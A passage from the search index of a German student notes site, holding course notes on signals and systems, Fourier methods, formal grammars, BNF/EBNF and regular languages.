(DFT)","text":"<ul> <li>Verwendet in der digitalen Signalverarbeitung, um diskrete Signale im Frequenzbereich darzustellen.</li> <li>Berechnung durch Fast Fourier Transform (FFT).</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#3-systemtheorie","title":"3. Systemtheorie","text":"<p>Ein System verarbeitet Eingangssignale und erzeugt Ausgangssignale.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#31-eigenschaften-eines-systems","title":"3.1 Eigenschaften eines Systems","text":"<ul> <li>Linearit\u00e4t: Wenn das System die \u00dcberlagerung von Signalen beibeh\u00e4lt.</li> <li>Zeitinvarianz: Wenn sich das Systemverhalten nicht \u00e4ndert, egal wann ein Signal anliegt.</li> <li>Kausalit\u00e4t: Das System reagiert nur auf vergangene und gegenw\u00e4rtige Eingaben.</li> <li>Stabilit\u00e4t: Wenn das Ausgangssignal f\u00fcr eine begrenzte Eingabe begrenzt bleibt.</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#32-ubertragungsfunktion","title":"3.2 \u00dcbertragungsfunktion","text":"<ul> <li> <p>Die \u00dcbertragungsfunktion beschreibt das Verhalten eines Systems im Frequenzbereich: $$ H(f) = \\frac{Y(f)}{X(f)} $$</p> <ul> <li>Zeigt, welche Frequenzen verst\u00e4rkt oder abgeschw\u00e4cht werden.</li> <li>Wird f\u00fcr Filter und Signalverarbeitung verwendet.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#4-filter","title":"4. Filter","text":"<p>Filter dienen dazu, bestimmte Frequenzanteile eines Signals zu d\u00e4mpfen oder zu verst\u00e4rken.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#41-arten-von-filtern","title":"4.1 Arten von Filtern","text":"<ul> <li>Tiefpassfilter: L\u00e4sst niedrige Frequenzen durch, blockiert hohe.</li> <li>Hochpassfilter: L\u00e4sst hohe Frequenzen durch, blockiert niedrige.</li> <li>Bandpassfilter: L\u00e4sst nur einen bestimmten Frequenzbereich durch.</li> <li>Notch-Filter: Blockiert eine schmale Frequenz (z. B. Netzbrumm 50 Hz).</li> <li> <p>Digitale Filter:</p> <ul> <li>FIR-Filter (Finite Impulse Response)</li> <li>IIR-Filter (Infinite Impulse Response)</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/1.%20Grundlagen/#5-digitalisierung-von-signalen","title":"5. Digitalisierung von Signalen","text":"<ul> <li> <p>Abtastung (Sampling):</p> <ul> <li>Um ein analoges Signal digital zu verarbeiten, wird es mit einer bestimmten Frequenz abgetastet.</li> <li>Nyquist-Theorem: Die Abtastfrequenz muss mindestens das Doppelte der h\u00f6chsten Signalfrequenz sein.</li> <li> <p>Quantisierung:</p> </li> <li> <p>Der kontinuierliche Wertebereich wird in diskrete Stufen umgewandelt.</p> </li> <li>F\u00fchrt zu Quantisierungsrauschen.</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/","title":"2. Signale","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#grundlagen-signale","title":"Grundlagen Signale","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#1-eigenschaften-von-signalen","title":"1. Eigenschaften von Signalen","text":"<p>Signale sind physikalische oder mathematische Funktionen, die Informationen \u00fcber ein System transportieren. Sie k\u00f6nnen in der Zeit <code>x(t)</code> oder im Frequenzbereich <code>X(f)</code> dargestellt werden</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#11-klassifikation-von-signalen","title":"1.1 Klassifikation von Signalen","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#111-analog-vs-digital","title":"1.1.1 Analog vs. Digital","text":"<p>\ud83d\udc49 Warum ist das wichtig? Analoge und digitale Signale haben in der realen Welt sehr unterschiedliche Anwendungen. Die Wahl zwischen ihnen beeinflusst Messgenauigkeit, St\u00f6ranf\u00e4lligkeit und Verarbeitung.</p> <p>Analoge Signale</p> <ul> <li>Kontinuierlich in der Zeit und im Wertebereich.</li> <li>Beispiel: Spannung eines Temperatursensors - die Temperatur kann jede beliebige Zwischenstufe annehmen.</li> <li>Mathematische Darstellung: \u2192 Das ist eine Sinusschwingung mit 10 Hz, die kontinuierlich in der Zeit ist.</li> </ul> \\[ x(t)=2sin\u2061(2\u03c010t) \\] <p>Digitale Signale</p> <ul> <li>Bestehen aus diskreten (abgetasteten) Werten.</li> <li>Beispiel: Audiodatei auf deinem Computer - Das Mikrofon nimmt ein analoges Signal auf, aber die Soundkarte speichert es als Zahlenwerte.</li> </ul> <p>Digitalisierte Version des obigen Signals:</p> \\[x[n]=2sin\u2061(2\u03c010nTs)\\] <ul> <li>Hier ist \\(Ts\\) die Abtastzeit, die bestimmt, wie oft wir das Signal pro Sekunde speichern (z. B. 44.1 kHz bei CDs).</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#112-deterministisch-vs-stochastisch","title":"1.1.2 Deterministisch vs. Stochastisch","text":"<p>\ud83d\udc49 Warum ist das wichtig? Die Art eines Signals bestimmt, ob es mit exakten Formeln beschrieben werden kann oder ob wir mit Wahrscheinlichkeiten arbeiten m\u00fcssen.</p> <p>\ud83d\udd0e Wichtige Anwendung: Rauschen in einer elektrischen Schaltung ist stochastisch. Um es zu reduzieren, braucht man Filter oder statistische Methoden.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#deterministische-signale","title":"Deterministische Signale","text":"<ul> <li>Sind genau vorhersagbar.</li> <li>Beispiel: Ein Sinussignal in einer Wechselstromleitung (50 Hz Netzspannung).</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#stochastisches-signal","title":"Stochastisches Signal","text":"<ul> <li>Enthalten zuf\u00e4llige Komponenten und lassen sich nur statistisch beschreiben.</li> <li>Beispiel: Temperaturmessungen \u00fcber den Tag - kleine Schwankungen durch Wind oder Sonnenstrahlung sind zuf\u00e4llig.</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#113-periodisch-vs-aperiodisch","title":"1.1.3 Periodisch vs. Aperiodisch","text":"<p>\ud83d\udc49 Warum ist das wichtig? Periodische Signale haben eine wiederholende Struktur, die mit Fourier-Methoden leicht analysiert werden kann.</p> <ul> <li> <p>Periodische Signale</p> <ul> <li>Wiederholen sich in festen Abst\u00e4nden.</li> <li>Beispiel: Sinusspannung im Stromnetz (50 Hz in Europa).</li> </ul> <p>Mathematische Darstellung:</p> \\[x(t)=sin\u2061(2\u03c0f0t)\\] <p>\u2192 Hier ist \\(f0\\)\u200b die Frequenz in Hz.</p> </li> <li> <p>Aperiodische Signale</p> <ul> <li>Haben keine feste Wiederholung.</li> <li>Beispiel: Herzschlag (EKG-Signal) - es schwankt leicht und hat keine perfekte Periodizit\u00e4t.</li> </ul> </li> </ul> <p>\ud83d\udd0e Wichtige Anwendung: F\u00fcr periodische Signale kann man Fourier-Transformationen verwenden. Aperiodische Signale analysiert man oft mit der Laplace-Transformation.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#erklarung","title":"Erkl\u00e4rung:","text":"<ul> <li>Ein deterministisches Signal kann periodisch sein, z. B. eine Sinusspannung mit einer festen Frequenz.</li> <li>Ein deterministisches Signal kann aber auch aperiodisch sein, z. B. ein einmaliges Impulssignal oder ein Signal mit exponentiellem Abklingen.</li> <li>Ein stochastisches Signal kann ebenfalls periodisch erscheinen, wenn es zuf\u00e4llige Variationen um eine Basisfrequenz hat (z. B. ein verrauschtes Sinussignal).</li> <li>Ein stochastisches Signal ist oft aperiodisch, weil es zuf\u00e4llige Schwankungen enth\u00e4lt (z. B. thermisches Rauschen in einer Schaltung).</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#beispielhafte-einordnung-von-signalen","title":"Beispielhafte Einordnung von Signalen","text":"<ol> <li>50 Hz Netzspannung (Sinuswelle) \u2192 Deterministisch &amp; Periodisch</li> <li>EKG-Signal \u2192 Deterministisch &amp; Aperiodisch (weil leicht variierend, aber nicht zuf\u00e4llig)</li> <li>Thermisches Rauschen \u2192 Stochastisch &amp; Aperiodisch</li> <li>Jitter in einem Taktgeber \u2192 Stochastisch &amp; Periodisch (da es um eine Grundfrequenz variiert)</li> </ol>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#114-energie-vs-leistungssignale","title":"1.1.4 Energie- vs. Leistungssignale","text":"<p>\ud83d\udc49 Warum ist das wichtig? Diese Unterscheidung ist in der Signalverarbeitung zentral, weil sie bestimmt, welche Analyseverfahren anwendbar sind.</p> <ul> <li> <p>Energiesignale</p> <ul> <li>Haben eine endliche Gesamtenergie.</li> <li>Beispiel: Ein kurzer elektrischer Impuls.</li> </ul> <p>Mathematische Definition:</p> \\[E=\u222b\u2212\u221e\u221e\u2223x(t)\u2223^2dt\\] <p>Falls EEE endlich ist, handelt es sich um ein Energiesignal.</p> </li> <li> <p>Leistungssignale</p> <ul> <li>Haben eine endliche, aber konstante mittlere Leistung.</li> <li>Beispiel: Ein Sinussignal \u00fcber eine lange Zeit.</li> </ul> <p>Mathematische Definition:</p> \\[P=lim\u2061T\u2192\u221e12T\u222b\u2212TT\u2223x(t)\u2223^2dt\\] <p>Falls PPP endlich ist, handelt es sich um ein Leistungssignal.</p> </li> </ul> <p>\ud83d\udd0e Wichtige Anwendung:</p> <ul> <li>Energiesignale tauchen oft in einmaligen Ereignissen auf (z. B. Pulssignale in der Medizintechnik).</li> <li>Leistungssignale sind relevant f\u00fcr dauerhafte \u00dcbertragungen (z. B. Radio- oder WLAN-Signale).</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#12-zeitbereichsanalyse","title":"1.2 Zeitbereichsanalyse","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#121-symmetrie-von-signalen","title":"1.2.1 Symmetrie von Signalen","text":"<p>\ud83d\udc49 Warum ist das wichtig? Die Symmetrie eines Signals bestimmt, ob man es effizienter verarbeiten kann (z. B. mit Fouriertransformationen).</p> <ul> <li> <p>Gerade Signale:</p> <ul> <li>Bleiben unver\u00e4ndert, wenn man sie spiegelt.</li> <li>Beispiel: Kosinusfunktion \\(\\(x(t)=cos\u2061(t)\u21d2x(\u2212t)=x(t)\\)\\)</li> <li> <p>Ungerade Signale:</p> </li> <li> <p>Wechseln das Vorzeichen bei Spiegelung.</p> </li> <li>Beispiel: Sinusfunktion \\(\\(x(t)=sin\u2061(t)\u21d2x(\u2212t)=\u2212x(t)\\)\\)</li> </ul> </li> </ul> <p>\ud83d\udd0e Wichtige Anwendung: Bei Fouriertransformationen verschwinden entweder Sinus- oder Kosinusanteile, wenn das Signal eine bestimmte Symmetrie hat.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#122-faltung-convolution","title":"1.2.2 Faltung (Convolution)","text":"<p>\ud83d\udc49 Warum ist das wichtig? Faltung beschreibt, wie ein System auf ein Eingangssignal reagiert.</p> <p>Mathematische Definition:</p> \\[(y * h)(t) = \\int_{-\\infty}^{\\infty} x(\\tau) h(t-\\tau) d\\tau\\] <ul> <li>\\(x(t)\\) ist das Eingangssignal.</li> <li>\\(h(t)\\) ist die Systemantwort.</li> <li>Das Ergebnis ist das Ausgangssignal.</li> </ul> <p>\ud83d\udd0e Wichtige Anwendung: Filter in der Signalverarbeitung nutzen die Faltung, um bestimmte Frequenzen herauszufiltern (z. B. Rauschunterdr\u00fcckung).</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/2.%20Signale/#123-delta-impuls-t","title":"1.2.3 Delta-Impuls \u03b4(t)","text":"<p>\ud83d\udc49 Warum ist das wichtig? Der Delta-Impuls ist ein ideales Testsignal f\u00fcr Systeme.</p> <ul> <li>Definition:  $\\(\\(\u03b4(t)={\u221e,t=00,t\u22600\\delta(t) = \\begin{cases} \\infty, &amp; t = 0 \\\\ 0, &amp; t \\neq 0 \\end{cases}\u03b4(t)={\u221e,0,\u200bt=0t\ue020=0\\)\\)</li> <li>\u200b mit der Eigenschaft \\(\\(\\int_{-\\infty}^{\\infty} \\delta(t) dt = 1\\)\\)</li> </ul> <p>\ud83d\udd0e Wichtige Anwendung:</p> <ul> <li>Wird zur Systemanalyse genutzt, weil die Systemantwort auf einen Delta-Impuls die sogenannte Impulsantwort liefert.</li> </ul>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/","title":"3. Fourier Analyse","text":"","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#uberblick-fourier-methoden-im-vergleich","title":"\ud83d\udccc \u00dcberblick: Fourier-Methoden im Vergleich","text":"Methode Was macht sie? Wof\u00fcr wird sie verwendet? Was fehlt? Fourier-Reihe (FR) Zerlegt periodische Signale in Sinus- und Kosinuswellen Analyse von periodischen Signalen (z. B. Wechselstrom, Musiknoten, Schwingungen) Nur f\u00fcr periodische Signale geeignet Fourier-Transformation (FT) Wandelt ein Signal in ein Spektrum von Frequenzen Zeigt, welche Frequenzen in einem Signal enthalten sind Zeigt nicht, wann die Frequenzen auftreten Diskrete Fourier-Transformation (DFT) Macht das Gleiche wie die FT, aber f\u00fcr diskrete Werte (digitale Signale) Digitale Signalverarbeitung, MP3, Bilder, Audio Langsam f\u00fcr gro\u00dfe Datenmengen Fast Fourier Transform (FFT) Schnelle Berechnung der DFT Alles, wo Fourier in Echtzeit ben\u00f6tigt wird (z. B. Spracherkennung, Soundeffekte) Hat die gleichen Einschr\u00e4nkungen wie DFT Kurzzeit-Fourier-Transformation (STFT) Zerlegt das Signal in kleine Zeitabschnitte und berechnet Fourier f\u00fcr jeden Abschnitt Wann welche Frequenzen auftreten (Musik, Sprache, Medizin, Radar) Schlechte Zeitaufl\u00f6sung f\u00fcr hohe Frequenzen Wavelet-Transformation Kombination von STFT und Fourier mit flexibler Analyse Bessere Analyse von pl\u00f6tzlichen \u00c4nderungen in Signalen Komplexer zu berechnen als STFT","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#1-fourier-reihe-fr","title":"\ud83d\udd39 1. Fourier-Reihe (FR)","text":"<p>Wann? Wenn das Signal periodisch ist. Was passiert? Das Signal wird in eine Summe von Sinus- und Kosinusfunktionen zerlegt.</p> <p>\ud83d\udca1 Beispiel:</p> <ul> <li>Eine Wechselspannung (50 Hz) kann mit der Fourier-Reihe beschrieben werden.</li> <li>Ein periodisches Musiksignal kann analysiert werden.</li> </ul> <p>\ud83d\udcca Fourier-Reihe Ergebnis (diskrete Frequenzen bei periodischem Signal)</p> <p><code>0Hz     50Hz     100Hz    150Hz    200Hz</code> <code>|________/\\______/\\_______/\\______/\\_____|</code></p> <p>\ud83d\udc49 Funktioniert nur f\u00fcr periodische Signale.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#2-fourier-transformation-ft","title":"\ud83d\udd39 2. Fourier-Transformation (FT)","text":"<p>Wann? Wenn das Signal nicht-periodisch ist. Was passiert? Das Signal wird in ein kontinuierliches Frequenzspektrum umgewandelt.</p> <p>\ud83d\udca1 Beispiel:</p> <ul> <li>Eine einmalige Explosion oder ein einzelner Ton wird in alle enthaltenen Frequenzen zerlegt.</li> <li>Wird benutzt f\u00fcr MP3-Kompression, Noise-Filter, Bildverarbeitung.</li> </ul> <p>\ud83d\udcca Fourier-Transformiertes Spektrum</p> <p><code>0Hz     100Hz    200Hz    300Hz    400Hz    500Hz   |_______|_______|_______|_______|_________/\\______|</code></p> <p>\ud83d\udc49 Wir sehen alle Frequenzen, aber nicht, wann sie auftreten.</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#3-diskrete-fourier-transformation-dft","title":"\ud83d\udd39 3. Diskrete Fourier-Transformation (DFT)","text":"<p>Wann? Wenn wir nur diskrete Werte (digitale Signale) haben. Was passiert? Das Gleiche wie bei FT, aber mit einer endlichen Anzahl von Datenpunkten.</p> <p>\ud83d\udca1 Beispiel:</p> <ul> <li>Wenn wir ein digitales Mikrofon-Signal analysieren, brauchen wir DFT.</li> <li>MP3-Dateien speichern nur die wichtigsten Frequenzen aus der DFT.</li> </ul> <p>\ud83d\udcca DFT (diskrete Frequenzwerte)</p> <p><code>0Hz     100Hz    200Hz    300Hz    400Hz    500Hz   |_______|_______|_______|_______|___/\\____|______|</code></p> <p>\ud83d\udc49 Gleich wie FT, aber f\u00fcr digitale Signale.</p> <p>\u2705 FFT (Fast Fourier Transform) ist eine optimierte Version von DFT, die schneller ist!</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#4-kurzzeit-fourier-transformation-stft","title":"\ud83d\udd39 4. Kurzzeit-Fourier-Transformation (STFT)","text":"<p>Wann? Wenn sich das Signal \u00fcber die Zeit ver\u00e4ndert. Was passiert? Das Signal wird in kleine Zeitabschnitte zerlegt und f\u00fcr jedes Fenster eine Fourier-Transformation berechnet.</p> <p>\ud83d\udca1 Beispiel:</p> <ul> <li>Sprachverarbeitung: Zeigt, wann \u201es\u201c oder \u201ea\u201c gesprochen wird.</li> <li>Musikerkennung (Shazam): Erkennt welche Frequenzen wann auftreten.</li> <li>EKG: Analysiert Herzrhythmusst\u00f6rungen.</li> </ul> <p>\ud83d\udcca Spektrogramm (STFT-Ergebnis: Frequenz vs. Zeit)</p> <p><code>Zeit \u2192</code> <code>0s      1s      2s      3s      4s</code> <code>-------------------------------------</code> <code>| 440Hz  | 440Hz  | 880Hz  | 880Hz  |</code> <code>-------------------------------------</code></p> <p>\ud83d\udc49 Jetzt sehen wir, wann welche Frequenzen auftreten!</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#5-wavelet-transformation","title":"\ud83d\udd39 5. Wavelet-Transformation","text":"<p>Wann? Wenn wir eine flexiblere Frequenz-Zeit-Analyse brauchen. Was passiert? Das Signal wird mit flexiblen Fenstern analysiert - hohe Frequenzen mit kleinen Fenstern, niedrige Frequenzen mit gro\u00dfen Fenstern.</p> <p>\ud83d\udca1 Beispiel:</p> <ul> <li>Gehirnwellen (EEG): Erkennt pl\u00f6tzliche \u00c4nderungen besser als STFT.</li> <li>Radar: Erkennt bewegte Objekte pr\u00e4ziser als STFT.</li> </ul> <p>\ud83d\udcca Wavelet-Analyse (Frequenzaufl\u00f6sung variiert mit der Zeit)</p> <p><code>Zeit \u2192</code> <code>0s      1s      2s      3s      4s</code> <code>-------------------------------------</code> <code>| 440Hz  | 440Hz  | 880Hz  | 880Hz  |</code> <code>|______Wavelet zeigt mehr Details____|</code></p> <p>\ud83d\udc49 Bessere Anpassung an schnelle und langsame Ver\u00e4nderungen im Signal!</p>","tags":["Course/"]},{"location":"studium/Signale%20Sensoren%20Systeme/3.%20Fourier%20Analyse/#finale-zusammenfassung","title":"\ud83d\udccc Finale Zusammenfassung","text":"Methode Wann benutzen? Was sehen wir? Fourier-Reihe (FR) Periodische Signale Nur diskrete Frequenzen Fourier-Transformation (FT) Aperiodische Signale Gesamtes Frequenzspektrum (aber keine Zeit-Info) Diskrete Fourier-Transformation (DFT/FFT) Digitale Signale Diskrete Frequenzen f\u00fcr digitale Werte Kurzzeit-Fourier-Transformation (STFT) Frequenzen \u00fcber die Zeit Frequenzen vs. Zeit (wann sie auftreten) Wavelet-Transformation Noch flexiblere Analyse Frequenzaufl\u00f6sung passt sich der Zeit an","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/","title":"1. Sprachen u. Grammatik u. BNF u. Syntaxdiagramm","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#thema-1-sprachen-und-grammatiken-bnf-syntaxdiagramm","title":"Thema 1: Sprachen und Grammatiken, BNF, Syntaxdiagramm","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#1-formale-sprachen","title":"1. Formale Sprachen","text":"<ul> <li> <p>Definition: Eine formale Sprache ist eine Menge von Zeichenketten (Strings), die aus einem bestimmten Alphabet gebildet werden und durch definierte Regeln beschrieben werden.</p> </li> <li> <p>Alphabet (\u03a3): Eine endliche Menge von Symbolen, z.B. \u03a3 = {a, b}.</p> </li> <li>W\u00f6rter: Endliche Sequenzen von Symbolen aus dem Alphabet, z.B. \"abba\".</li> <li>Sprache (L): Eine Menge von W\u00f6rtern, z.B. L = {\"a\", \"ab\", \"abb\"}.</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#2-grammatiken","title":"2. Grammatiken","text":"<ul> <li> <p>Definition: Eine Grammatik beschreibt, wie g\u00fcltige W\u00f6rter einer Sprache gebildet werden.</p> </li> <li> <p>Bestandteile einer Grammatik (G):</p> <ul> <li>N (Nichtterminalsymbole): Platzhalter f\u00fcr Symbolfolgen (z.B. S, A, B).</li> <li>\u03a3 (Terminalsymbole): Endsymbole der Sprache (z.B. a, b).</li> <li>P (Produktionsregeln): Regeln zur Erzeugung von Symbolfolgen (z.B. S \u2192 aSb | \u03b5).</li> <li>S (Startsymbol): Das Symbol, von dem aus die Ableitung beginnt.</li> </ul> </li> </ul> <p>Beispiel:</p> <ul> <li>Grammatik G = ({S}, {a, b}, P, S) mit P = {S \u2192 aSb | \u03b5}</li> <li>Diese Grammatik erzeugt die Sprache: L = {\"\", \"ab\", \"aabb\", \"aaabbb\", ...} (symmetrische W\u00f6rter mit gleich vielen a und b).</li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#3-backus-naur-form-bnf","title":"3. Backus-Naur-Form (BNF)","text":"<ul> <li> <p>Definition: Eine Notation zur formalen Beschreibung der Syntax von Programmiersprachen und Grammatiken.</p> </li> <li> <p>Syntax: </p> <ul> <li><code>::=</code> \u2192 Definiert eine Produktionsregel (z.B. <code>&lt;A&gt; ::= a | b</code>)</li> <li><code>|</code> \u2192 Alternativen (ODER-Verkn\u00fcpfung), z.B. <code>a | b</code> bedeutet \u201ea oder b\u201c</li> </ul> </li> </ul> <p>Beispiel:</p> <ul> <li> <p>BNF zur Beschreibung von einfachen arithmetischen Ausdr\u00fccken:</p> <pre><code>&lt;expr&gt; ::= &lt;term&gt; | &lt;term&gt; + &lt;expr&gt;\n&lt;term&gt; ::= &lt;factor&gt; | &lt;factor&gt; * &lt;term&gt;\n&lt;factor&gt; ::= ( &lt;expr&gt; ) | number\n</code></pre> </li> <li> <p>Erkl\u00e4rung: Ein Ausdruck <code>&lt;expr&gt;</code> kann ein Term <code>&lt;term&gt;</code> sein oder ein Term plus ein weiterer Ausdruck.</p> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#31-erweiterte-ebnf-symbole","title":"3.1 Erweiterte EBNF-Symbole:","text":"Symbol Bedeutung Beispiel Erkl\u00e4rung <code>{ }</code> Wiederholung (0 oder mehr) <code>{ a }</code> Beliebig viele <code>a</code> (auch 0-mal m\u00f6glich) <code>[ ]</code> Optional (0 oder 1-mal) <code>[ b ]</code> <code>b</code> kann vorkommen, muss aber nicht <code>( )</code> Gruppierung <code>( a                          | b ) c</code> <code>+</code> Mindestens einmal wiederholen <code>a+</code> (in manchen Varianten) <code>a</code> muss mindestens einmal vorkommen <code>?</code> Optional (wie <code>[ ]</code> in EBNF) <code>b?</code> (in manchen Varianten) <code>b</code> ist optional","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#beispiele-fur-ebnf-regeln","title":"Beispiele f\u00fcr EBNF-Regeln:","text":"<ol> <li> <p>Wiederholung (<code>{ }</code>):</p> <p><code>&lt;digit&gt; ::= { 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 }</code> \u2192 Beliebig viele Ziffern, z.B. <code>123</code>, <code>4567</code>, oder auch nichts (0-mal).</p> </li> <li> <p>Optional (<code>[ ]</code>):</p> <p><code>&lt;sign&gt; ::= [ + | - ]</code> \u2192 Ein optionales Plus- oder Minuszeichen, z.B. <code>+5</code>, <code>-10</code>, oder einfach <code>42</code>.</p> </li> <li> <p>Kombination von Wiederholung und Optional:</p> <p><code>&lt;identifier&gt; ::= letter { letter | digit } [ \"_\" { letter | digit } ]</code> \u2192 Definiert ein Identifier:</p> <ul> <li>Beginnt mit einem Buchstaben</li> <li>Gefolgt von beliebigen Buchstaben/Ziffern</li> <li>Optional kann ein Unterstrich mit weiteren Buchstaben/Ziffern folgen</li> <li>Beispiele: <code>x1</code>, <code>var_name</code>, <code>count123</code></li> <li>Gruppierung (<code>( )</code>):</li> </ul> <p><code>&lt;expr&gt; ::= ( &lt;term&gt; \"+\" &lt;term&gt; ) | ( &lt;term&gt; \"-\" &lt;term&gt; )</code> \u2192 Ein Ausdruck ist entweder <code>term + term</code> oder <code>term - term</code>.</p> </li> <li> <p>Definition: Grafische Darstellung von BNF-Regeln zur besseren Visualisierung.</p> </li> <li> <p>Elemente:</p> <ul> <li>Ovale oder Rechtecke f\u00fcr Terminalsymbole.</li> <li>Pfeile f\u00fcr den Ablauf.</li> <li>Schleifen f\u00fcr Wiederholungen.</li> </ul> </li> </ol> <p>Beispiel:</p> <ul> <li>Syntaxdiagramm f\u00fcr <code>&lt;expr&gt; ::= &lt;term&gt; | &lt;term&gt; + &lt;expr&gt;</code><ul> <li>Start \u2192 <code>&lt;term&gt;</code> \u2192 (+) \u2192 <code>&lt;expr&gt;</code> (mit einer Schleife f\u00fcr wiederholte Additionen).</li> </ul> </li> </ul>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#4-syntaxdiagramme-railroad-diagrams","title":"4. Syntaxdiagramme (Railroad Diagrams)","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#5-wichtige-konzepte-und-anwendungen","title":"5. Wichtige Konzepte und Anwendungen","text":"<ul> <li> <p>Warum wichtig?</p> <ul> <li>Grundlegend f\u00fcr die Definition von Programmiersprachen.</li> <li>Wird in Compilern, Parsern und zur Syntaxanalyse verwendet.</li> </ul> </li> <li> <p>Typische Pr\u00fcfungsaufgaben:</p> <ul> <li>Umwandlung von Grammatiken in BNF.</li> <li>Erstellen von Syntaxdiagrammen.</li> <li>Ableitung von W\u00f6rtern mit gegebenen Produktionsregeln.</li> </ul> </li> </ul> <p>1. Umwandlung von Grammatiken in BNF</p> <p>Gegeben:</p> <pre><code>A \u2192 bCDe | cDCd\nC \u2192 abA\nD \u2192 ab[C]\n</code></pre> <p>BNF-Form:</p> <pre><code>&lt;A&gt; ::= b &lt;C&gt; &lt;D&gt; e | c &lt;D&gt; &lt;C&gt; d\n&lt;C&gt; ::= a b &lt;A&gt;\n&lt;D&gt; ::= a b [&lt;C&gt;]\n</code></pre> <p>2. Erstellen von Syntaxdiagrammen 3.1 Erstellen von BNF aus Syntaxdiagramm 3.2 Ableitung von W\u00f6rtern mit gegebenen Produktionsregeln </p>","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/1.%20Sprachen%20u.%20Grammatik%20u.%20BNF%20u.%20Syntaxdiagramm/#beispielaufgaben","title":"Beispielaufgaben:","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/","title":"2. Regul\u00e4re Sprachen, Endlicher Automat, Regul\u00e4re Grammatik","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#thema-2-regulare-sprachen-endlicher-automat-regulare-grammatik","title":"Thema 2: Regul\u00e4re Sprachen, Endlicher Automat, Regul\u00e4re Grammatik","text":"","tags":["Course/"]},{"location":"studium/Theoretische%20Informatik/2.%20Regul%C3%A4re%20Sprachen%2C%20Endlicher%20Automat%2C%20Regul%C3%A4re%20Grammatik/#1-regulare-sprachen","title":"1. Regul\u00e4re Sprachen","text":"<ul> <li> <p>Definition: Eine regul\u00e4re Sprache ist eine formale Sprache, die von einem endlichen Automaten (DFA oder NFA) erkannt wird oder durch einen regul\u00e4ren Ausdruck beschrieben werden kann.</p> </li> <li> <p>Beispiele:</p> <ul> <li>Sprache aller W\u00f6rter, die nur aus \"a\" und \"b\" bestehen und mit \"ab\" enden: <code>(a|b)*ab</code></li> <li>Sprache aller 